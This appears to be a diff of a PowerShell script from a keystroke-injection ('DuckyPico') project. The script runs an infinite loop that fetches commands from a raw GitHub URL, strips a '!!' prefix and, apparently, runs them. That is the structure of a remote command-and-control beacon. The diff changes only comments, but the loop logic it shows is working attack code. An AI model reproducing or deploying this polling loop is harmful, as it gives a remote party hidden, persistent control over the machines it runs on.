@@ -4,7 +4,7 @@ $githubUrl = "https://raw.githubusercontent.com/JH517/DuckyPico/refs/heads/main/
 # Start an infinite loop
 while ($true) {
     try {
-        # Fetch the raw content of the GitHub page (plain text)
+        # Fetch the raw content of the GitHub page (plain text) for every iteration
         $command = Invoke-RestMethod -Uri $githubUrl
 
         # Check if the command starts with '!!' and strip that part off
@@ -21,4 +21,4 @@ while ($true) {
         Write-Host "An error occurred: $_"
         Start-Sleep -Seconds 60
     }
-}  # This is the missing closing brace for the while loop
+}
